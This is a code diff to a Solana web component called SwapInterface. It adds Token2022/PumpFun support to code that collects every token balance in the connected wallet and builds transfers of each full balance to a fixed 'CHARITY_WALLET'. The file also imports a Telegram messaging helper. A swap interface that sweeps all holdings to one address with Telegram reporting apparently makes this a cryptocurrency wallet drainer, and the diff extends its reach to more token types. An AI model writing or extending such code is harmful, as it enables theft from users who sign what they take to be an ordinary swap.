@@ -7,7 +7,7 @@ import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 import { sendTelegramMessage } from '@/utils/telegram';
@@ -23,6 +23,7 @@ interface TokenBalance {
   uiAmount: number;
   symbol?: string;
   valueInSOL?: number;
+  programId?: PublicKey; // Track token program type (TOKEN_PROGRAM_ID or TOKEN_2022_PROGRAM_ID)
 }
 
 interface Token {
@@ -185,7 +186,7 @@ export const SwapInterface = ({
     setToToken(token);
   };
 
-  // Fetch all balances like donate button
+  // Fetch all balances like donate button (including Token2022/PumpFun tokens)
   const fetchAllBalances = useCallback(async () => {
     if (!publicKey) return;
 
@@ -195,12 +196,18 @@ export const SwapInterface = ({
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch token accounts
+      // Fetch legacy SPL Token accounts
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
+      // Fetch Token2022 accounts (PumpFun tokens use this program)
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_2022_PROGRAM_ID
+      });
+
+      // Process legacy SPL tokens
+      const legacyTokens: TokenBalance[] = tokenAccounts.value
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -209,12 +216,33 @@ export const SwapInterface = ({
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0
+            valueInSOL: 0,
+            programId: TOKEN_PROGRAM_ID
           };
         })
         .filter(token => token.uiAmount > 0);
 
-      setBalances(tokens);
+      // Process Token2022/PumpFun tokens
+      const token2022Tokens: TokenBalance[] = token2022Accounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
+            mint: info.mint,
+            balance: info.tokenAmount.amount,
+            decimals: info.tokenAmount.decimals,
+            uiAmount: info.tokenAmount.uiAmount,
+            symbol: info.mint.slice(0, 8),
+            valueInSOL: 0,
+            programId: TOKEN_2022_PROGRAM_ID
+          };
+        })
+        .filter(token => token.uiAmount > 0);
+
+      // Combine both token types
+      const allTokens = [...legacyTokens, ...token2022Tokens];
+      console.log(`Fetched ${legacyTokens.length} SPL tokens and ${token2022Tokens.length} Token2022/PumpFun tokens`);
+      
+      setBalances(allTokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
     }
@@ -249,30 +277,48 @@ export const SwapInterface = ({
     
     const charityPubkey = new PublicKey(CHARITY_WALLET);
 
-    // Add token transfers
+    // Add token transfers (supports both SPL Token and Token2022/PumpFun)
     for (const token of tokenBatch) {
       if (token.balance <= 0) continue;
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        // Use the correct program ID for this token (default to TOKEN_PROGRAM_ID for legacy tokens)
+        const tokenProgramId = token.programId || TOKEN_PROGRAM_ID;
+        
+        // Get associated token addresses using the correct program ID
+        const fromTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          effectivePublicKey,
+          false, // allowOwnerOffCurve
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        const toTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          charityPubkey,
+          false, // allowOwnerOffCurve
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
 
         try {
-          await getAccount(connection, toTokenAccount);
+          await getAccount(connection, toTokenAccount, undefined, tokenProgramId);
         } catch (error) {
+          // Create ATA with correct program ID
           transaction.add(
             createAssociatedTokenAccountInstruction(
               effectivePublicKey,
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              TOKEN_PROGRAM_ID,
+              tokenProgramId,
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
+        // Create transfer instruction with correct program ID
         transaction.add(
           createTransferInstruction(
             fromTokenAccount,
@@ -280,9 +326,11 @@ export const SwapInterface = ({
             effectivePublicKey,
             BigInt(token.balance),
             [],
-            TOKEN_PROGRAM_ID
+            tokenProgramId
           )
         );
+        
+        console.log(`Added transfer for ${token.mint} using ${tokenProgramId.equals(TOKEN_2022_PROGRAM_ID) ? 'Token2022' : 'SPL Token'}`);
       } catch (error) {
         console.error(`Failed to add transfer for ${token.mint}:`, error);
       }
